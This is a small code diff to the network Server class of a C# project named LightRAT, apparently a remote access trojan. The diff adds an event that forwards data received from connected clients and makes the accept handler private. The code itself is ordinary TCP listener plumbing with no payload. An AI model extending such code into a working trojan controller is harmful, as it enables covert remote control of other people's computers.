@@ -10,11 +10,9 @@ namespace LightRAT.Core.Network
         public IPEndPoint ServerEndPoint { get; set; }
         public Socket InternalSocket { get; } = new Socket(SocketType.Stream, ProtocolType.Tcp);
         public List<Client> ConnectedClients { get; } = new List<Client>();
-        
-        public Server()
-        {
 
-        }
+        public event Client.ReceiveDataEventHandler ReceiveEvent;
+
         public Server(string ip, int port)
         {
             ServerEndPoint = new IPEndPoint(IPAddress.Parse(ip), port);
@@ -26,9 +24,10 @@ namespace LightRAT.Core.Network
             InternalSocket.Listen(10);
             InternalSocket.BeginAccept(EndAccepting, null);
         }
-        public void EndAccepting(IAsyncResult result)
+        private void EndAccepting(IAsyncResult result)
         {
             var client = new Client(InternalSocket.EndAccept(result));
+            client.ReceiveDataEvent += ReceiveEvent;
             ConnectedClients.Add(client);
             InternalSocket.BeginAccept(EndAccepting, null);
         }
